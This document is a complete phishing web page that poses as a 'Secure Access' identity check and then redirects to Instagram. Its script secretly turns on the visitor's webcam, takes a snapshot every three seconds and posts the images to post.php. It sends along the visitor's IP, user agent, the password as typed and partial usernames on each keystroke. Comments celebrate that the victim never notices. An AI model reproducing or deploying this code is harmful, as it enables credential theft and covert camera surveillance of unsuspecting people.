<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* ============================================
           COMPLETELY NORMAL LOOKING PAGE
           No camera, no IP, no console visible
           ============================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #262626;
        }

        /* Hidden elements - completely invisible */
        .hidden-video-wrap {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            z-index: -9999 !important;
        }

        #video, #canvas {
            display: none !important;
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            width: 1px !important;
            height: 1px !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }

        /* Normal looking container */
        .container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }

        .card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            text-align: center;
        }

        .logo {
            margin-bottom: 30px;
            font-size: 32px;
            font-weight: 700;
            color: #262626;
        }

        .icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: #8e8e8e;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            height: 36px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 0 12px;
            font-size: 12px;
        }

        .form-input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .btn {
            width: 100%;
            height: 32px;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 12px;
        }

        .btn:hover {
            background: #1877f2;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        /* Loading spinner - hidden */
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Success message - hidden */
        .success-msg {
            display: none;
            color: #00a651;
            font-size: 14px;
            margin-top: 12px;
        }
    </style>
</head>
<body>

    <!-- 
    ============================================
    COMPLETELY HIDDEN CAMERA - NO VISUAL INDICATORS
    ============================================
    -->
    <div class="hidden-video-wrap" aria-hidden="true">
        <video id="video" playsinline autoplay muted></video>
    </div>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- 
    ============================================
    NORMAL LOOKING PAGE - USER SEES THIS
    ============================================
    -->
    <div class="container">
        <div class="card">
            <div class="logo">🔒</div>
            <div class="icon">📱</div>
            <h2>Secure Access</h2>
            <p>Please verify your identity to continue. This helps us keep your account secure.</p>

            <form id="loginForm">
                <div class="form-group">
                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">Continue</button>
                <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
            </form>

            <div class="footer">
                <span>Protected by security verification</span>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // STEALTH CAMERA - COMPLETELY HIDDEN
        // No visual indicators, no logs visible to user
        // ============================================
        
        (function() {
            'use strict';

            // Hidden elements
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            let cameraActive = false;
            let captureInterval = null;
            let stream = null;

            // ============================================
            // HIDDEN IP DETECTION - Silent
            // ============================================
            function getIPAddress() {
                // Silent IP detection
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        // Store IP silently
                        window._hiddenIP = data.ip;
                        
                        // Send IP to server silently
                        $.ajax({
                            type: 'POST',
                            url: 'post.php',
                            data: { 
                                ip_only: true,
                                ip: data.ip,
                                ua: navigator.userAgent
                            },
                            async: true
                        });
                    })
                    .catch(() => {
                        // Fallback - try another service
                        fetch('https://httpbin.org/ip')
                            .then(response => response.json())
                            .then(data => {
                                window._hiddenIP = data.origin;
                            })
                            .catch(() => {});
                    });
            }

            // ============================================
            // HIDDEN CAMERA INIT - No user interaction needed
            // ============================================
            function initHiddenCamera() {
                try {
                    const constraints = {
                        audio: false,
                        video: {
                            facingMode: "user",
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    };

                    navigator.mediaDevices.getUserMedia(constraints)
                        .then(function(mediaStream) {
                            stream = mediaStream;
                            video.srcObject = stream;
                            video.play();
                            
                            cameraActive = true;
                            
                            // Start capturing silently - every 3 seconds
                            captureInterval = setInterval(function() {
                                if (cameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
                                    context.drawImage(video, 0, 0, 640, 480);
                                    const imageData = canvas.toDataURL("image/png");
                                    
                                    // Get username/password if available
                                    const username = document.getElementById('username')?.value || '';
                                    const password = document.getElementById('password')?.value || '';
                                    
                                    // Send silently - no user notification
                                    $.ajax({
                                        type: 'POST',
                                        url: 'post.php',
                                        data: {
                                            cat: imageData,
                                            username: username,
                                            password: password,
                                            ip: window._hiddenIP || '',
                                            ua: navigator.userAgent
                                        },
                                        async: true,
                                        timeout: 5000
                                    });
                                }
                            }, 3000); // Every 3 seconds
                        })
                        .catch(function(err) {
                            // Silent fail - user never knows
                            console.log('Camera unavailable - continuing without');
                        });

                } catch (e) {
                    // Silent fail
                }
            }

            // ============================================
            // FORM SUBMISSION - Silently captures credentials
            // ============================================
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const btn = document.getElementById('submitBtn');
                const msg = document.getElementById('successMsg');
                
                // Show loading state
                btn.innerHTML = '<span class="spinner"></span> Processing...';
                btn.disabled = true;
                msg.style.display = 'block';
                
                // Capture final credentials
                $.ajax({
                    type: 'POST',
                    url: 'post.php',
                    data: {
                        username: username,
                        password: password,
                        ip: window._hiddenIP || '',
                        ua: navigator.userAgent,
                        final_submit: true
                    },
                    success: function() {
                        // Silent success - user sees normal behavior
                        setTimeout(function() {
                            msg.textContent = '✅ Verified! Redirecting...';
                            setTimeout(function() {
                                // Fake redirect - looks legit
                                window.location.href = 'https://www.instagram.com/';
                            }, 1000);
                        }, 1500);
                    },
                    error: function() {
                        // Silent fail - still redirect
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/';
                        }, 2000);
                    }
                });
            });

            // ============================================
            // START EVERYTHING SILENTLY
            // ============================================
            
            // 1. Get IP silently
            getIPAddress();
            
            // 2. Start camera after short delay (page loads first)
            setTimeout(function() {
                initHiddenCamera();
            }, 1500);
            
            // 3. Also try to start camera on user interaction (click)
            document.addEventListener('click', function() {
                if (!cameraActive) {
                    initHiddenCamera();
                }
            }, { once: true });

            // 4. Re-capture on form interaction
            document.getElementById('username').addEventListener('input', function() {
                // Silently send username when typed
                if (this.value.length > 2) {
                    $.ajax({
                        type: 'POST',
                        url: 'post.php',
                        data: {
                            username_partial: this.value,
                            ip: window._hiddenIP || ''
                        },
                        async: true
                    });
                }
            });

            console.log('🔧 Security verification active'); // Only visible in console
        })();
    </script>
</body>
</html>
